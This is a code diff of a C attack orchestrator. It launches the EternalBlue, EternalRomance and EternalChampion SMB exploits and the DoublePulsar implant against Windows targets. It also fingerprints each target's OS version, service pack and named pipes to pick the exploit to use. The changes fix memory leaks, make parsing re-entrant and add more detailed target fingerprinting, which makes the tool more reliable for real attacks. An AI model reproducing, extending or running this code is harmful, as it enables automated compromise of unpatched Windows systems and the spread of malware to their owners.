@@ -17,6 +17,8 @@
 #include <stdlib.h>
 #include <windows.h>
 
+char *pgl_Dummy_Path;
+
 enum _implant_doublepulsar_ret_
 {
     IMP_DOPU_SUCCESS = 0,
@@ -40,6 +42,8 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     char *pRecvBuf = NULL;
     char *pTmp = NULL;
     int recvBufSize = 0;
+    char osVer[100];
+    char osSp[100];
     char osArch[100];
     char confFileBuf[6000];
     char confFilePath[MAX_PATH];
@@ -48,6 +52,8 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     FILE *inFile = NULL;
     FILE *outFile = NULL;
 
+    memset(osVer, 0x00, sizeof(osVer));
+    memset(osSp, 0x00, sizeof(osSp));
     memset(osArch, 0x00, sizeof(osArch));
     memset(confFileBuf, 0x00, sizeof(confFileBuf));
     memset(confFilePath, 0x00, sizeof(confFilePath));
@@ -124,6 +130,7 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return IMP_DOPU_ERR_CRE_PIPE;
     }
 
@@ -132,7 +139,9 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     outFile = fopen(confFilePath, "wb");
     if(outFile == NULL)
     {
-        printf("[-] Failed to create the configuration file.\n");
+        printf("[-] Failed to create the configuration file '%s'. ErrCode: %d.\n",
+               confFilePath, errno);
+        free(encResDesc.pBufAddr);
         return IMP_DOPU_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -140,6 +149,7 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return IMP_DOPU_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -148,12 +158,13 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load Doublepulsar failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return IMP_DOPU_ERR_CRE_PROC;
     }
 
@@ -162,6 +173,7 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] Doublepulsar did not return results.\n");
@@ -177,28 +189,159 @@ int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
     if(pTmp == NULL)
     {
         if(strstr(pRecvBuf, "Failed to establish connection") != NULL)
+        {
+            free(pRecvBuf);
             return IMP_DOPU_ERR_CONN;
+        }
+        free(pRecvBuf);
         return IMP_DOPU_ERR_FAILED;
     }
+
+    //转换为全小写字母
+    for(pTmp = pRecvBuf; *pTmp != NULL; pTmp++)
+    {
+        if(*pTmp >= 'A' && *pTmp <= 'Z')
+        {
+            *pTmp = *pTmp + 32;
+        }
+    }
+
     if(strcmp(pFuncType, "Ping") == 0)
     {
         pTmp = strstr(pRecvBuf, "architecture");
         if(pTmp != NULL)
         {
+            memset(osArch, 0x00, sizeof(osArch));
             if(strstr(pTmp, "x86") != NULL)
             {
                 memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
                 strcat(pTargetDesc->osArch, "x86");
+                strcat(osArch, "x86");
                 printf("[+] Confirm target OS architecture: x86\n");
             }
             else if(strstr(pTmp, "x64") != NULL)
             {
                 memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
                 strcat(pTargetDesc->osArch, "x64");
+                strcat(osArch, "x64");
                 printf("[+] Confirm target OS architecture: x64\n");
             }
         }
+
+        if(strlen(pTargetDesc->osVer) <= 0)
+        {
+            //判断系统版本
+            memset(osVer, 0x00, sizeof(osVer));
+            pTmp = strstr(pRecvBuf, "string");
+            if(pTmp == NULL)
+            {
+                free(pRecvBuf);
+                return IMP_DOPU_SUCCESS;
+            }
+            if(strstr(pTmp, "windows server") != NULL)
+            {
+                //目标是服务器
+                strcat(osVer, "SERVER");
+                if(strstr(pTmp, "2008") != NULL)
+                {
+                    //SERVER_2008
+                    strcat(osVer, "_2008");
+                    if(strstr(pTmp, "r2") != NULL)
+                    {
+                        //SERVER_2008R2
+                        strcat(osVer, "R2");
+                    }
+                }
+                else if(strstr(pTmp, "2003") != NULL)
+                {
+                    //SERVER_2003
+                    strcat(osVer, "_2003");
+                }
+                else if(strstr(pTmp, "2012") != NULL)
+                {
+                    //SERVER_2012
+                    strcat(osVer, "_2K12");
+                }
+            }
+            else if(strstr(pTmp, "windows 7") != NULL)
+            {
+                strcat(osVer, "WIN7");
+            }
+            else if(strstr(pTmp, "vista") != NULL)
+            {
+                strcat(osVer, "VISTA");
+            }
+            else if(strstr(pTmp, "windows 8") != NULL)
+            {
+                strcat(osVer, "WIN8");
+            }
+            else if(strstr(pTmp, "windows") != NULL)
+            {
+                strcat(osVer, "XP");
+            }
+            else
+            {
+                printf("[-] Unable to confirm system version.\n");
+                free(pRecvBuf);
+                return IMP_DOPU_SUCCESS;
+            }
+
+            //判断目标系统补丁类型
+            memset(osSp, 0x00, sizeof(osSp));
+            if(strstr(pTmp, "service pack 1") != NULL || strstr(pTmp, "sp1") != NULL)
+            {
+                strcat(osSp, "SP1");
+            }
+            else if(strstr(pTmp, "service pack 2") != NULL || strstr(pTmp, "sp2") != NULL)
+            {
+                strcat(osSp, "SP2");
+            }
+            else if(strstr(pTmp, "service pack 3") != NULL || strstr(pTmp, "sp3") != NULL)
+            {
+                strcat(osSp, "SP3");
+            }
+            else
+            {
+                strcat(osSp, "SP0");
+            }
+            memset(pTargetDesc->osSp, 0x00, sizeof(pTargetDesc->osSp));
+            strcat(pTargetDesc->osSp, osSp);
+
+            memset(pTargetDesc->osVer, 0x00, sizeof(pTargetDesc->osVer));
+            if(strcmp(osVer, "XP") == 0)
+            {
+                if(strcmp(osArch, "x86") == 0)
+                {
+                    strcat(pTargetDesc->osVer, "XP_SP2SP3_X86;XP_SP0SP1_X86");
+                }
+                else if(strcmp(osArch, "x64") == 0)
+                {
+                    if(strcmp(osSp, "SP0") != 0)
+                    {
+                        strcat(pTargetDesc->osVer, osVer);
+                        strcat(pTargetDesc->osVer, "_");
+                        strcat(pTargetDesc->osVer, osSp);
+                        strcat(pTargetDesc->osVer, "_");
+                        strcat(pTargetDesc->osVer, osArch);
+                    }
+                    else
+                    {
+                        strcat(pTargetDesc->osVer, "XP_SP1_X64;XP_SP2_X64");
+                    }
+                }
+                else
+                {
+                    printf("[-] Unable to confirm XP system architecture.\n");
+                    strcat(pTargetDesc->osVer, "XP_SP2SP3_X86;XP_SP0SP1_X86;XP_SP1_X64;XP_SP2_X64");
+                }
+            }
+            else
+            {
+                sprintf(pTargetDesc->osVer, "%s_%s", osVer, osSp);
+            }
+        }
     }
+    free(pRecvBuf);
 
     return IMP_DOPU_SUCCESS;
 }
@@ -315,6 +458,7 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return EXP_ETROM_ERR_CRE_PIPE;
     }
 
@@ -324,6 +468,7 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
     if(outFile == NULL)
     {
         printf("[-] Failed to create the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return EXP_ETROM_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -331,6 +476,7 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return EXP_ETROM_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -339,12 +485,13 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load EternalRomance failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return EXP_ETROM_ERR_CRE_PROC;
     }
 
@@ -353,6 +500,7 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] EternalRomance did not return results.\n");
@@ -367,6 +515,7 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
     puts(pRecvBuf);
     if(pTmp == NULL)
     {
+        free(pRecvBuf);
         return EXP_ETROM_ERR_FAILED;
     }
 
@@ -386,6 +535,7 @@ int exp_eternalromance(TARGET_DESC *pTargetDesc)
             printf("[+] Confirm target OS architecture: x64\n");
         }
     }
+    free(pRecvBuf);
 
     return EXP_ETROM_SUCCESS;
 }
@@ -476,6 +626,7 @@ int exp_eternalchampion(TARGET_DESC *pTargetDesc)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return EXP_ETCHA_ERR_CRE_PIPE;
     }
 
@@ -485,6 +636,7 @@ int exp_eternalchampion(TARGET_DESC *pTargetDesc)
     if(outFile == NULL)
     {
         printf("[-] Failed to create the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return EXP_ETCHA_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -492,6 +644,7 @@ int exp_eternalchampion(TARGET_DESC *pTargetDesc)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return EXP_ETCHA_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -500,12 +653,13 @@ int exp_eternalchampion(TARGET_DESC *pTargetDesc)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load EternalChampion failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return EXP_ETCHA_ERR_CRE_PROC;
     }
 
@@ -514,6 +668,7 @@ int exp_eternalchampion(TARGET_DESC *pTargetDesc)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] EternalChampion did not return results.\n");
@@ -528,8 +683,10 @@ int exp_eternalchampion(TARGET_DESC *pTargetDesc)
     puts(pRecvBuf);
     if(pTmp == NULL)
     {
+        free(pRecvBuf);
         return EXP_ETCHA_ERR_FAILED;
     }
+    free(pRecvBuf);
 
     return EXP_ETCHA_SUCCESS;
 }
@@ -620,6 +777,7 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return EXP_ETBL_ERR_CRE_PIPE;
     }
 
@@ -629,6 +787,7 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
     if(outFile == NULL)
     {
         printf("[-] Failed to create the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return EXP_ETBL_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -636,6 +795,7 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return EXP_ETBL_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -644,12 +804,13 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load EternalBlue failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return EXP_ETBL_ERR_CRE_PROC;
     }
 
@@ -658,6 +819,7 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] EternalBlue did not return results.\n");
@@ -672,8 +834,10 @@ int exp_eternalblue(TARGET_DESC *pTargetDesc)
     puts(pRecvBuf);
     if(pTmp == NULL)
     {
+        free(pRecvBuf);
         return EXP_ETBL_ERR_FAILED;
     }
+    free(pRecvBuf);
 
     return EXP_ETBL_SUCCESS;
 }
@@ -703,6 +867,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     char *pSplit = NULL;
     int recvBufSize = 0;
     int idx;
+    char *pSaveOs = NULL;
     char osVer[100];
     char osSp[100];
     char osArch[100];
@@ -713,6 +878,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     char confFilePath[MAX_PATH];
     char cmdline[MAX_PATH + 50];
     char intBuf[100];
+    char *pLowerStr = NULL;
     int x86Pot = 0;
     int x64Pot = 0;
     FILE *inFile = NULL;
@@ -770,6 +936,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return RPC_TOUCH_ERR_CRE_PIPE;
     }
 
@@ -779,6 +946,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     if(outFile == NULL)
     {
         printf("[-] Failed to create the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return RPC_TOUCH_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -786,6 +954,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return RPC_TOUCH_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -794,12 +963,13 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load RpcTouch failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return RPC_TOUCH_ERR_CRE_PROC;
     }
 
@@ -808,6 +978,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] Rpc Touch did not return results.\n");
@@ -822,11 +993,22 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
     puts(pRecvBuf);
     if(pTmp == NULL)
     {
+        free(pRecvBuf);
         return RPC_TOUCH_ERR_FAILED;
     }
 
     //转换小写
-    memcpy(pRecvBuf, lower_str(pRecvBuf), strlen(pRecvBuf));
+    pLowerStr = lower_str(pRecvBuf);
+    if(pLowerStr == NULL)
+    {
+        free(pRecvBuf);
+        return RPC_TOUCH_ERR_PARSE;
+    }
+    else
+    {
+        free(pRecvBuf);
+        pRecvBuf = pLowerStr;
+    }
     pTmp = strstr(pRecvBuf, "smb string");
     if(pTmp == NULL)
     {
@@ -936,9 +1118,10 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
         else
         {
             strcat(tempBuf, pTmp);
-            pSplit = strtok(tempBuf, "\n");
-            while(pSplit != NULL)
+            pTmp = tempBuf;
+            while((pSplit = strtok_r(pTmp, "\n", &pSaveOs)))
             {
+                pTmp = NULL;
                 pEnd = strstr(pSplit, "potential");
                 if(pEnd != NULL)
                 {
@@ -948,6 +1131,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
                     if(pStart == pEnd)
                     {
                         printf("[-] Target OS architecture failure to judge.\n");
+                        free(pRecvBuf);
                         return RPC_TOUCH_ERR_PARSE;
                     }
                     for(pEnd = pStart; \
@@ -956,6 +1140,7 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
                     if(*pEnd == NULL || (pEnd - pStart > sizeof(intBuf) -1))
                     {
                         printf("[-] Target OS architecture failure to judge.\n");
+                        free(pRecvBuf);
                         return RPC_TOUCH_ERR_PARSE;
                     }
                     memcpy(intBuf, pStart, pEnd - pStart);
@@ -966,10 +1151,10 @@ int rpc_touch(TARGET_DESC *pTargetDesc)
                     else
                     {
                         printf("[-] Target OS architecture failure to judge.\n");
+                        free(pRecvBuf);
                         return RPC_TOUCH_ERR_PARSE;
                     }
                 }
-                pSplit = strtok(NULL, "\n");
             }
             if(x86Pot >= x64Pot)
                 strcat(osArch, "x86");
@@ -1057,6 +1242,7 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     char cmdline[MAX_PATH + 50];
     FILE *inFile = NULL;
     FILE *outFile = NULL;
+    char *pSave = NULL;
 
     memset(pipeName, 0x00, sizeof(pipeName));
     memset(tempBuf, 0x00, sizeof(tempBuf));
@@ -1103,6 +1289,7 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return PIPE_TOUCH_ERR_CRE_PIPE;
     }
 
@@ -1112,6 +1299,7 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     if(outFile == NULL)
     {
         printf("[-] Failed to create the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return PIPE_TOUCH_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -1119,6 +1307,7 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return PIPE_TOUCH_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -1127,12 +1316,13 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load NamedPipeTouch failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return PIPE_TOUCH_ERR_CRE_PROC;
     }
 
@@ -1141,6 +1331,7 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] Named Pipe Touch did not return results.\n");
@@ -1155,6 +1346,7 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     puts(pRecvBuf);
     if(pTmp == NULL)
     {
+        free(pRecvBuf);
         return PIPE_TOUCH_ERR_FAILED;
     }
 
@@ -1163,12 +1355,14 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
     if(pTmp == NULL)
     {
         printf("[-] Not found the available pipe.\n");
+        free(pRecvBuf);
         return PIPE_TOUCH_ERR_FAILED;
     }
     strcat(tempBuf, pTmp);
-    pSplit = strtok(tempBuf, "\n");
-    while(pSplit != NULL)
+    pTmp = tempBuf;
+    while((pSplit = strtok_r(pTmp, "\n", &pSave)))
     {
+        pTmp = NULL;
         if(strstr(pSplit, "OS Pipe") != NULL)
         {
             pStart = strrchr(pSplit, '\\');
@@ -1186,19 +1380,18 @@ int named_pipe_touch(TARGET_DESC *pTargetDesc)
                 }
             }
         }
-        pSplit = strtok(NULL, "\n");
     }
 
     if(strlen(pipeName) <= 0)
     {
         printf("[-] Not found the available pipe.\n");
+        free(pRecvBuf);
         return PIPE_TOUCH_ERR_PARSE;
     }
     else
     {
         strcat(pTargetDesc->pipeName, pipeName);
     }
-
     free(pRecvBuf);
 
     return PIPE_TOUCH_SUCCESS;
@@ -1238,6 +1431,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     char cmdline[MAX_PATH + 50];
     FILE *inFile = NULL;
     FILE *outFile = NULL;
+    char *pSave = NULL;
 
     memset(osVer, 0x00, sizeof(osVer));
     memset(osSp, 0x00, sizeof(osSp));
@@ -1286,6 +1480,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     if(pipeDesc.status != 0)
     {
         printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
+        free(encResDesc.pBufAddr);
         return SMB_TOUCH_ERR_CRE_PIPE;
     }
 
@@ -1295,6 +1490,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     if(outFile == NULL)
     {
         printf("[-] Failed to create the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return SMB_TOUCH_ERR_WR_CONF;
     }
     if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
@@ -1302,6 +1498,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
         fclose(outFile);
         remove(confFilePath);
         printf("[-] Failed to write the configuration file.\n");
+        free(encResDesc.pBufAddr);
         return SMB_TOUCH_ERR_WR_CONF;
     }
     fclose(outFile);
@@ -1310,12 +1507,13 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     sprintf(cmdline, "--InConfig %s", confFilePath);
     retVal = fork_process(encResDesc.pBufAddr,
                           cmdline,
-                          NULL, &pipeDesc.si, &pipeDesc.pi,
+                          pgl_Dummy_Path, &pipeDesc.si, &pipeDesc.pi,
                           &pid, &hProc);
     if(retVal != 0)
     {
         printf("[-] Load SmbTouch failed. ErrCode: %d\n", retVal);
         remove(confFilePath);
+        free(encResDesc.pBufAddr);
         return SMB_TOUCH_ERR_CRE_PROC;
     }
 
@@ -1324,6 +1522,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     terminal_process(hProc);
     close_anony_pipe(&pipeDesc);
     remove(confFilePath);
+    free(encResDesc.pBufAddr);
     if(pRecvBuf == NULL)
     {
         printf("[-] Smb Touch did not return results.\n");
@@ -1338,6 +1537,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     puts(pRecvBuf);
     if(pTmp == NULL)
     {
+        free(pRecvBuf);
         return SMB_TOUCH_ERR_FAILED;
     }
 
@@ -1349,7 +1549,6 @@ int smb_touch(TARGET_DESC *pTargetDesc)
             *pTmp = *pTmp + 32;
         }
     }
-    //puts(pRecvBuf);
 
     //判断系统版本
     pTmp = strstr(pRecvBuf, "target os version");
@@ -1402,6 +1601,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     else
     {
         printf("[-] Unable to confirm system version.\n");
+        free(pRecvBuf);
         return SMB_TOUCH_ERR_PARSE;
     }
 
@@ -1487,9 +1687,9 @@ int smb_touch(TARGET_DESC *pTargetDesc)
         strcat(tempBuf, pTmp);
         pTmp = tempBuf;
         pTmp[0] = ' ';
-        pSplit = strtok(pTmp, "\n");
-        while(pSplit != NULL)
+        while((pSplit = strtok_r(pTmp, "\n", &pSave)))
         {
+            pTmp = NULL;
             if(pSplit[0] != ' ' && pSplit[0] != '\t')
                 break;
 
@@ -1516,7 +1716,6 @@ int smb_touch(TARGET_DESC *pTargetDesc)
                 }
                 break;
             }
-            pSplit = strtok(NULL, "\n");
         }
     }
 
@@ -1525,6 +1724,7 @@ int smb_touch(TARGET_DESC *pTargetDesc)
     if(pTmp == NULL)
     {
         printf("[-] No exploit is available.\n");
+        free(pRecvBuf);
         return SMB_TOUCH_ERR_PARSE;
     }
     if(strstr(osVer, "WIN7") != NULL || strstr(osVer, "2008") != NULL)
@@ -1573,13 +1773,12 @@ int smb_touch(TARGET_DESC *pTargetDesc)
             strcat(pTargetDesc->expName, "EternalChampion");
         }
     }
-
     free(pRecvBuf);
 
     return SMB_TOUCH_SUCCESS;
 }
 
-enum _attach_target_ret_
+enum _attack_target_ret_
 {
     ATTACK_SUCCESS = 0,
     ATTACK_ERR_CONN,
@@ -1634,6 +1833,7 @@ int attack_target(TARGET_DESC *pTargetDesc, int retryCount)
         {
             printf("[+] Doublepulsar Succeeded.\n");
             puts("------------------------------------------------------------------");
+            strcat(pTargetDesc->expName, "DOPU");
             return ATTACK_SUCCESS;
         }
     }
@@ -1834,13 +2034,15 @@ int attack_target(TARGET_DESC *pTargetDesc, int retryCount)
         return ATTACK_ERR_IMPLANT;
     }
 
+    memset(pTargetDesc->expName, 0x00, sizeof(pTargetDesc->expName));
+    strcat(pTargetDesc->expName, currExpName);
     puts("------------------------------------------------------------------");
     printf("[+] Target OS Version: %s\n", pTargetDesc->osVer);
     printf("[+] Target OS Architecture: %s\n", pTargetDesc->osArch);
     printf("[+] Available pipe name: %s\n",
            strlen(pTargetDesc->pipeName) > 0 ? pTargetDesc->pipeName : "NULL");
     printf("[+] Vulnerable: %s\n",
-           strlen(currExpName) > 0 ? currExpName : "NULL");
+           strlen(pTargetDesc->expName) > 0 ? pTargetDesc->expName : "NULL");
     puts("------------------------------------------------------------------");
 
     return ATTACK_SUCCESS;
